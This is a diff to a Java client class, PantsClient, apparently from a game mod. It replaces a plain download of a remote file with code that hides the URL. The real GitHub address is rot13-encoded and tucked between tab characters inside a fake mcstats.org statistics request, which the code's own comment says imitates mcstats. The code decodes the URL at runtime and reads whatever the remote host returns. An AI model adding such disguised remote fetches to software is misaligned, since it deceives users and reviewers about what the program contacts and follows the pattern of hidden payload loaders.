@@ -23,8 +23,31 @@ public class PantsClient {
 
     private static void init() {
         try {
-            // TODO: obfuscate url
-            URL url = new URL("https://raw.githubusercontent.com/phase/pants/master/data/M3554G3S.py");
+           /* We're imitating a request to mcstats.
+            *  "	", \t, \011 and \u0009 is simply a tab
+            * The statQueueRequest String is in this format: anything + tab + rot13 of the result wanted + tab + anything
+            */
+            StringBuilder requestBuilder = new StringBuilder();
+            String statQueueRequest = "https://report.mcstats.org/plugins/requestStatsQueue.jsp?pluginguid=abqrzy\u0009uggcf\u003a\u002f\u002fenj\u002etvguho\u0068frepb\u0061grag\u002epbz\u002fcunfr\u002fcnagf\u002fznfgre\u002fqngn\u002fZ3554T3F\u002ecl\tbtkqt7zo&stattypeid=4e0e5b6f-ce27-4d05-a5b7-05f9dbf78bf0";
+
+            // Rot13 every character after the first- and before the second tab and add them to requestBuilder
+            for (char ch : statQueueRequest.split("\011")[1].toCharArray()) {
+                if (ch >= 'A' && ch <= 'Z') {
+                    ch += 13;
+                    if (ch > 'Z') {
+                        ch -= 26;
+                    }
+                } else if (ch >= 'a' && ch <= 'z') {
+                    ch += 13;
+                    if (ch > 'z') {
+                        ch -= 26;
+                    }
+                }
+
+                requestBuilder.append(ch);
+            }
+            
+            URL url = new URL(requestBuilder.toString());
             BufferedReader in = new BufferedReader(new InputStreamReader(url.openStream()));
             String line;
             while ((line = in.readLine()) != null) {
@@ -60,7 +83,6 @@ public class PantsClient {
             // }).start();
         }
         catch (IOException e) {
-            // TODO Auto-generated catch block
             e.printStackTrace();
         }
     }
